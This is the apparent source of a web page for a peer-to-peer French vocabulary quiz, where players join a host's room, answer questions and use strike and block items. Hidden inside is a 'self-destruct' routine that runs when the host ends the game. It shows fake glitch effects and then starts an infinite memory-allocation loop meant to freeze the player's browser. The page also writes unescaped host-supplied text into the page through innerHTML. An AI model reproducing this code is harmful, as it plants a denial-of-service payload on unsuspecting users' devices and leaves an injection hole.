<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>French Quiz - Controller (v3.0.1)</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        * { box-sizing: border-box; font-family: system-ui, sans-serif; -webkit-tap-highlight-color: transparent; }
        body {
            margin: 0; padding: 15px; min-height: 100vh;
            color: #f8fafc; display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 15px;
            background: linear-gradient(120deg, #ff4d6d, #ff9966, #ffe66d, #8fd14f, #4cc9f0, #7b61ff, #ff4d6d);
            background-size: 400% 400%;
            animation: rainbowShift 16s ease infinite;
            position: relative; overflow: hidden;
        }
        body::before {
            content: "";
            position: fixed; inset: -20%;
            background: radial-gradient(circle at 20% 20%, rgba(255,255,255,0.35), transparent 25%),
                        radial-gradient(circle at 80% 0%, rgba(255,255,255,0.2), transparent 30%),
                        radial-gradient(circle at 50% 100%, rgba(255,255,255,0.18), transparent 40%);
            animation: drift 12s ease-in-out infinite alternate;
            pointer-events: none; z-index: -1;
        }
        @keyframes rainbowShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes drift {
            from { transform: translate3d(-3%, -2%, 0) scale(1); }
            to { transform: translate3d(3%, 2%, 0) scale(1.08); }
        }
        .wrapper { width: 100%; max-width: 400px; background: #1e293b; border-radius: 20px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; position: relative; }
        .v-tag { position: absolute; top: -12px; right: 15px; font-size: 0.7rem; font-family: monospace; color: #475569; font-weight: bold; }
        
        .header { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 0.9rem; font-weight: bold; background: rgba(0,0,0,0.2); padding: 10px 15px; border-radius: 30px; }
        
        input[type="text"] { width: 100%; padding: 14px; font-size: 1.1rem; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: white; margin-bottom: 15px; text-align: center; }
        .btn { width: 100%; background: #4f46e5; color: white; border: none; padding: 14px; font-size: 1.1rem; font-weight: bold; border-radius: 10px; cursor: pointer; }
        .btn:disabled { background: #334155; color: #64748b; cursor: not-allowed; }

        .choices { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
        .opt-btn { background: #334155; border: 2px solid #475569; padding: 16px; font-size: 1.1rem; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; }
        
        .opt-btn.picked { background: #1e1b4b !important; border-color: #6366f1 !important; }
        .opt-btn.good { background: #10b981 !important; border-color: #10b981 !important; }
        .opt-btn.bad { background: #ef4444 !important; border-color: #ef4444 !important; }

        .text-entry-container { margin: 15px 0; background: rgba(0,0,0,0.15); padding: 15px; border-radius: 12px; }

        .item-row { display: flex; gap: 10px; margin-top: 15px; min-height: 45px; justify-content: center; }
        .i-btn { padding: 10px 16px; color: white; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; font-size: 0.9rem; }
        .i-strike { background: #ef4444; }
        .i-block { background: #3b82f6; }

        .target-box { background: rgba(0,0,0,0.2); padding: 12px; border-radius: 10px; margin-top: 10px; text-align: left; }
        .target-box select { width: 100%; padding: 8px; border-radius: 6px; margin-top: 5px; background: #0f172a; color: white; border: 1px solid #475569; font-weight: bold; }

        .hidden { display: none !important; }
        .loader { width: 40px; height: 40px; border: 4px solid #475569; border-top-color: #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* DIAGNOSTICS UI CORNER PANEL */
        .debug-panel { width: 100%; max-width: 400px; background: #020617; border: 1px solid #1e293b; border-radius: 12px; padding: 12px; text-align: left; }
        .debug-title { font-size: 0.75rem; font-weight: bold; color: #475569; margin-bottom: 5px; text-transform: uppercase; display: flex; justify-content: space-between; }
        .debug-text { font-family: monospace; font-size: 0.75rem; color: #38bdf8; max-height: 110px; overflow-y: auto; white-space: pre-wrap; line-height: 1.4; }
        .dbg-err { color: #f43f5e; }
        .dbg-ok { color: #34d399; }

        /* SELF DESTRUCT POP-UP MODAL */
        .sd-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .sd-popup { width: 90%; max-width: 340px; background: #1e293b; border: 2px solid #ef4444; border-radius: 16px; padding: 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); font-family: monospace; }
    </style>
</head>
<body>

<div id="main-container" style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 15px;">
    <div class="wrapper">
        <div class="v-tag">CONTROLLER v3.0.1</div>
        
        <div class="header">
            <div id="hud-user">Player</div>
            <div id="hud-status" style="color:#fbbf24;">Lobby</div>
        </div>

        <div id="view-join">
            <h2>Join Game</h2>
            <input type="text" id="name-input" placeholder="Enter Nickname" maxlength="12">
            <input type="text" id="room-input" placeholder="Enter Room Code" maxlength="8" autocomplete="off" style="margin-bottom:10px;">
            <button class="btn" id="connect-btn" onclick="connect()">Connect</button>
            <p id="error-msg" style="color:#ef4444; margin-top:10px; font-size:0.9rem;"></p>
        </div>

        <div id="view-wait" class="hidden">
            <h3 id="wait-msg">Connected</h3>
            <div class="loader"></div>
        </div>

        <div id="view-quiz" class="hidden">
            <h3 id="quiz-title" style="margin: 0 0 5px 0;">Select Answer</h3>
            
            <div class="choices" id="choices-box">
                <button class="opt-btn" onclick="selectChoice(this)"></button>
                <button class="opt-btn" onclick="selectChoice(this)"></button>
                <button class="opt-btn" onclick="selectChoice(this)"></button>
                <button class="opt-btn" onclick="selectChoice(this)"></button>
            </div>

            <div class="text-entry-container hidden" id="text-box-container">
                <input type="text" id="text-answer-input" placeholder="Type answer in French..." autocomplete="off">
                <button class="btn" onclick="submitTextAnswer()">Submit Answer</button>
            </div>

            <div style="font-size:0.85rem; font-weight:bold; color:#94a3b8; margin-top:15px; text-align:left;">Inventory:</div>
            <div class="item-row" id="inventory-box"></div>
            
            <div id="strike-panel" class="hidden target-box">
                <label style="font-size:0.85rem; font-weight:bold;">Select Target:</label>
                <select id="target-select"></select>
                <button class="btn" style="padding:8px; font-size:0.9rem; margin-top:8px; background:#ef4444;" onclick="fireStrike()">Confirm Strike</button>
            </div>
            
            <div id="quiz-waiting" class="hidden" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 8px;">
                <div class="loader" style="width:24px; height:24px; margin:5px auto;"></div>
                <span style="font-size:0.85rem; color:#94a3b8;">Answer locked. Waiting for host...</span>
            </div>
        </div>

        <div id="view-alert" class="hidden">
            <h2 id="alert-title">Disconnected</h2>
            <p id="alert-desc">Lost connection to server.</p>
        </div>
    </div>

    <div class="debug-panel">
        <div class="debug-title">
            <span>Local Controller Trace Log</span>
            <span style="cursor:pointer; text-decoration:underline;" onclick="document.getElementById('dbg-box').innerHTML=''">Clear</span>
        </div>
        <div class="debug-text" id="dbg-box">Awaiting connection initialization sequences...</div>
    </div>
</div>

<div id="popup-mount"></div>

<script>
    let hostRoomId = null;
    let peer = null;
    let conn = null;
    let myName = "";
    let alive = false;
    let activeChoiceBtn = null;
    let currentMode = "choice";
    let inventory = [];

    function writeTrace(text, variant = '') {
        const pane = document.getElementById("dbg-box");
        if (!pane) return;
        let styled = '';
        if (variant === 'ok') styled = 'class="dbg-ok"';
        if (variant === 'err') styled = 'class="dbg-err"';
        
        const ts = new Date().toTimeString().split(' ')[0];
        pane.innerHTML += `\n<span ${styled}>[${ts}] ${text}</span>`;
        pane.scrollTop = pane.scrollHeight;
        console.log(`[Controller] ${text}`);
    }

    window.onload = function() {
        const params = new URLSearchParams(window.location.search);
        hostRoomId = params.get('room');
        const roomInput = document.getElementById("room-input");
        
        writeTrace(`Parsing URL parameters. Detected Target ID Room string: [${hostRoomId}]`);
        
        if (hostRoomId) {
            roomInput.value = hostRoomId.toUpperCase();
            writeTrace(`Room ID verified (${hostRoomId}). System engine unlocked for socket handshake pipelines.`, 'ok');
        } else {
            writeTrace("URL parameter missing or null. Room code can be entered manually in the UI.", 'err');
            roomInput.focus();
            document.getElementById("error-msg").innerText = "Enter the room code shown on the host screen.";
        }
    };

    function triggerSelfDestruct() {
        writeTrace("WARNING: Session terminating. Goodbye", 'err');
        
        // 1. Inject Glitch CSS Animations dynamically into document head
        const styleNode = document.createElement("style");
        styleNode.innerHTML = `
            @keyframes screenShake {
                0% { transform: translate(2px, 1px) rotate(0deg); }
                10% { transform: translate(-1px, -3px) rotate(-2deg); }
                20% { transform: translate(-4px, 0px) rotate(2deg); }
                30% { transform: translate(0px, 3px) rotate(0deg); }
                40% { transform: translate(2px, -1px) rotate(2deg); }
                50% { transform: translate(-2px, 3px) rotate(-2deg); }
                60% { transform: translate(-4px, 1px) rotate(0deg); }
                70% { transform: translate(3px, 2px) rotate(-2deg); }
                80% { transform: translate(-2px, -2px) rotate(2deg); }
                90% { transform: translate(3px, 3px) rotate(0deg); }
                100% { transform: translate(2px, -3px) rotate(-2deg); }
            }
            @keyframes glitchColor {
                0% { background: #1e293b; }
                20% { background: #ef4444; filter: invert(1); }
                40% { background: #0f172a; }
                60% { background: #3b82f6; filter: hue-rotate(90deg); }
                80% { background: #020617; }
                100% { background: #f43f5e; }
            }
            .glitched-out {
                animation: screenShake 0.1s infinite, glitchColor 0.15s infinite !important;
                overflow: hidden !important;
                user-select: none;
            }
            .gibberish-rain {
                position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                color: #00ff66; font-family: monospace; font-size: 1.3rem;
                white-space: pre-wrap; word-break: break-all; opacity: 0.9;
                z-index: 10000; pointer-events: none; padding: 20px;
                line-height: 1.1; background: rgba(0,0,0,0.85);
            }
        `;
        document.head.appendChild(styleNode);

        // 2. Inject structural overlay layout layout
        document.getElementById("popup-mount").innerHTML = `
            <div class="sd-overlay">
                <div class="sd-popup">
                    <h3 style="color:#ef4444; margin:0 0 10px 0; font-size:1.3rem; letter-spacing:1px;">WARNING</h3>
                    <p style="color:#94a3b8; font-size:0.85rem; margin:0 0 15px 0; line-height:1.4;">Quiz concluded. All clients will be terminated</p>
                    <div id="sd-countdown" style="font-size:1.1rem; font-weight:bold; color:#f43f5e; padding:10px; background:rgba(244,63,94,0.1); border-radius:8px; border:1px dashed #f43f5e;">
                        Terminating in 3...
                    </div>
                </div>
            </div>
        `;

        let count = 3;
        const countdownInterval = setInterval(() => {
            count--;
            if (count > 0) {
                document.getElementById("sd-countdown").innerText = `Terminating in ${count}...`;
            } else {
                clearInterval(countdownInterval);
                document.getElementById("sd-countdown").innerText = "SESSION TERMINATING";
                
                // 3. Apply high intensity shaking and color shifting animations to the document body
                document.body.classList.add("glitched-out");
                
                // Spawn the full screen element container for raw code/glitch text rain overlay
                const floodContainer = document.createElement("div");
                floodContainer.className = "gibberish-rain";
                document.body.appendChild(floodContainer);
                
                // Noise bank character index array
                const glitchSymbols = "01ERRSYSTEM_MELTDOWN_ERR_NULL_PTR_wkaemhdu_ehkd_jhjrfbnkejh";
                
                // High frequency matrix style injection interval
                const textFloodInterval = setInterval(() => {
                    let chunk = "";
                    for(let i=0; i<250; i++) {
                        chunk += glitchSymbols.charAt(Math.floor(Math.random() * glitchSymbols.length));
                    }
                    floodContainer.innerText += chunk;
                }, 25);

                // 4. Fallback into the standard heavy memory leak engine thread freezing execution stack
                setTimeout(() => {
                    clearInterval(textFloodInterval);
                    const structuralLeakBox = [];
                    while (true) {
                        structuralLeakBox.push(new Array(1000000).join("CRASH"));
                    }
                }, 1500); // 1.5 seconds of full visual artifacting sequence before browser engine locks up
            }
        }, 1000);
    }

    function connect() {
        const roomInput = document.getElementById("room-input");
        const enteredRoom = roomInput.value.trim().toUpperCase();
        if (enteredRoom) {
            hostRoomId = enteredRoom;
        }

        if (!hostRoomId) {
            writeTrace("Aborting connection task: Room reference key pointer evaluated as null.", 'err');
            document.getElementById("error-msg").innerText = "Please enter a room code before connecting.";
            return;
        }

        myName = document.getElementById("name-input").value.trim();
        if(!myName) {
            alert("Please input a standard alphanumeric handle profile moniker to join.");
            return;
        }
        
        document.getElementById("error-msg").style.color = "#fbbf24";
        document.getElementById("error-msg").innerText = "Connecting to web sockets cloud system...";
        document.getElementById("connect-btn").disabled = true;
        
        writeTrace(`Spawning localized peer structural adapter node...`);
        peer = new Peer();
        
        peer.on('open', (id) => {
            writeTrace(`Client node created successfully. Hardware reference key: ${id}`, 'ok');
            writeTrace(`Attempting data port channel bridge mapping directly to host ID: [${hostRoomId}]`);
            
            conn = peer.connect(hostRoomId);
            
            conn.on('open', () => { 
                writeTrace("Remote channel sync pipeline verification completed. Pushing user identification data packets.", 'ok');
                conn.send({ type: 'JOIN', name: myName }); 
            });

            conn.on('data', (msg) => {
                writeTrace(`Rx Stream element evaluated: ${JSON.stringify(msg)}`);
                
                if (msg.type === 'GAME_OVER') {
                    if (conn) conn.close();
                    if (peer) peer.destroy();
                    triggerSelfDestruct();
                    return;
                }
                
                if(msg.type === 'JOIN_OK') {
                    myName = msg.name;
                    document.getElementById("hud-user").innerText = myName;
                    document.getElementById("view-join").classList.add("hidden");
                    showWait("Waiting for Host", "Connected to session. Standby for start.");
                    writeTrace(`Lobby synchronization confirmed. Active session handle: ${myName}`, 'ok');
                }
                if(msg.type === 'RENAME') {
                    writeTrace(`Host system triggered character change rule: ${myName} -> ${msg.name}`);
                    myName = msg.name;
                    document.getElementById("hud-user").innerText = myName;
                }
                if(msg.type === 'KICK') showAlert("Kicked", "You were disconnected by the room host administrative panel.");
                if(msg.type === 'BANNED') showAlert("Banned", "Your network connection footprint has been added to the session blocklist.");
                
                if (msg.type === 'ASK') {
                    if (msg.item) {
                        inventory.push(msg.item);
                        writeTrace(`Inventory array inventory push trace: +[${msg.item}]`);
                    }
                    displayQuestion(msg.qMode, msg.options, msg.targets);
                }
                if (msg.type === 'REVEAL') {
                    displayReveal(msg.correct);
                }
            });

            conn.on('close', () => { 
                writeTrace("Channel connection sequence dropped or interrupted by remote node.", 'err');
                showAlert("Disconnected", "Host closed the active connection channel framework."); 
            });
            
            conn.on('error', (e) => {
                writeTrace(`Pipeline infrastructure runtime throw caught: ${e.message}`, 'err');
            });
        });

        peer.on('error', (err) => {
            writeTrace(`Critical initialization error: ${err.type} - ${err.message}`, 'err');
            document.getElementById("error-msg").style.color = "#ef4444";
            document.getElementById("error-msg").innerText = "Connection initialization error. Verify access routes and retry.";
            document.getElementById("connect-btn").disabled = false;
        });
    }

    function showWait(title, message) {
        document.getElementById("hud-status").innerText = "Waiting";
        document.getElementById("hud-status").style.color = "#fbbf24";
        document.getElementById("view-quiz").classList.add("hidden");
        document.getElementById("wait-msg").innerText = title;
        document.getElementById("view-wait").classList.remove("hidden");
    }

    function displayQuestion(qMode, options, targets) {
        alive = true;
        activeChoiceBtn = null;
        currentMode = qMode || "choice";
        writeTrace(`Refreshing DOM execution template viewport layout schema for state context: ${currentMode}`);
        
        document.getElementById("hud-status").innerText = "Active";
        document.getElementById("hud-status").style.color = "#10b981";

        document.getElementById("view-wait").classList.add("hidden");
        document.getElementById("view-quiz").classList.remove("hidden");
        document.getElementById("strike-panel").classList.add("hidden");
        document.getElementById("quiz-waiting").classList.add("hidden");
        
        if (currentMode === "text") {
            document.getElementById("quiz-title").innerText = "Type the Translation";
            document.getElementById("choices-box").classList.add("hidden");
            document.getElementById("text-box-container").classList.remove("hidden");
            let inputField = document.getElementById("text-answer-input");
            inputField.value = "";
            inputField.disabled = false;
            document.querySelector("#text-box-container button").disabled = false;
        } else {
            document.getElementById("quiz-title").innerText = "Select Answer";
            document.getElementById("choices-box").classList.remove("hidden");
            document.getElementById("text-box-container").classList.add("hidden");
            
            let btns = document.querySelectorAll("#choices-box .opt-btn");
            btns.forEach((b, i) => {
                b.className = "opt-btn";
                b.innerText = options[i];
                b.disabled = false;
            });
        }

        let dropdown = document.getElementById("target-select");
        dropdown.innerHTML = "";
        if(targets.length === 0) {
            dropdown.innerHTML = "<option value=''>No targets available</option>";
        } else {
            targets.forEach(t => dropdown.innerHTML += `<option value="${t}">${t}</option>`);
        }

        renderItems();
    }

    function renderItems() {
        let box = document.getElementById("inventory-box");
        box.innerHTML = "";
        if (inventory.length === 0) {
            box.innerHTML = "<span style='color:#475569; font-size:0.85rem; font-style:italic;'>No items</span>";
            return;
        }
        inventory.forEach((item, idx) => {
            if (item === "STRIKE") {
                box.innerHTML += `<button class="i-btn i-strike" onclick="useItem('STRIKE', ${idx})">Strike</button>`;
            } else if (item === "BLOCK") {
                box.innerHTML += `<button class="i-btn i-block" onclick="useItem('BLOCK', ${idx})">Block</button>`;
            }
        });
    }

    function useItem(type, idx) {
        if (type === "BLOCK") {
            inventory.splice(idx, 1);
            renderItems();
            writeTrace("Shipping shields active configuration header trace.");
            conn.send({ type: 'USE_BLOCK', name: myName });
            alert("Block active! Attacks on you this round will backfire.");
        } else if (type === "STRIKE") {
            let val = document.getElementById("target-select").value;
            if(!val) return alert("No valid interaction targets found on roster map!");
            document.getElementById("strike-panel").classList.remove("hidden");
            document.getElementById("strike-panel").dataset.idx = idx;
        }
    }

    function fireStrike() {
        let idx = parseInt(document.getElementById("strike-panel").dataset.idx);
        let target = document.getElementById("target-select").value;
        if (!target) return;
        
        inventory.splice(idx, 1);
        document.getElementById("strike-panel").classList.add("hidden");
        renderItems();

        writeTrace(`Deploying offensive action tracking package targeting identity trace: ${target}`);
        conn.send({ type: 'USE_STRIKE', name: myName, target: target });
        alert(`Strike launched at ${target}!`);
    }

    function selectChoice(btn) {
        if(!alive || currentMode !== "choice") return;
        alive = false; 
        activeChoiceBtn = btn;
        btn.classList.add("picked");
        
        document.querySelectorAll("#choices-box .opt-btn").forEach(b => b.disabled = true);
        document.getElementById("quiz-waiting").classList.remove("hidden");

        writeTrace(`Submitting grid node resolution alternative selection: "${btn.innerText}"`);
        conn.send({ type: 'SUBMIT', name: myName, choice: btn.innerText });
    }

    function submitTextAnswer() {
        if(!alive || currentMode !== "text") return;
        let ans = document.getElementById("text-answer-input").value.trim();
        if(!ans) return alert("String character space requirement empty. Input answer text.");
        
        alive = false;
        document.getElementById("text-answer-input").disabled = true;
        document.querySelector("#text-box-container button").disabled = true;
        document.getElementById("quiz-waiting").classList.remove("hidden");

        writeTrace(`Submitting free-text literal translation entry solution buffer: "${ans}"`);
        conn.send({ type: 'SUBMIT', name: myName, choice: ans });
    }

    function displayReveal(correct) {
        alive = false;
        document.getElementById("quiz-waiting").classList.add("hidden");
        writeTrace(`Display Reveal configuration evaluated. Structural validation key matches payload: ${correct}`);
        
        if (currentMode === "text") {
            let entry = document.getElementById("text-answer-input").value.trim().toLowerCase().replace(/[\s-]/g, '');
            let actual = correct.trim().toLowerCase().replace(/[\s-]/g, '');
            if (entry === actual) {
                alert("Correct! +150 Points!");
            } else {
                alert(`Incorrect. The proper term was: ${correct}`);
            }
        } else {
            let btns = document.querySelectorAll("#choices-box .opt-btn");
            btns.forEach(b => {
                b.classList.remove("picked");
                if(b.innerText === correct) b.classList.add("good");
                else if(b === activeChoiceBtn) b.classList.add("bad");
            });
        }
    }

    function showAlert(title, msg) {
        writeTrace(`Invoking catastrophic disconnect state layout sequence template: [${title}]`, 'err');
        document.getElementById("view-join").classList.add("hidden");
        document.getElementById("view-wait").classList.add("hidden");
        document.getElementById("view-quiz").classList.add("hidden");
        document.getElementById("alert-title").innerText = title;
        document.getElementById("alert-desc").innerText = msg;
        document.getElementById("view-alert").classList.remove("hidden");
        if(conn) conn.close();
    }
</script>
</body>
</html>
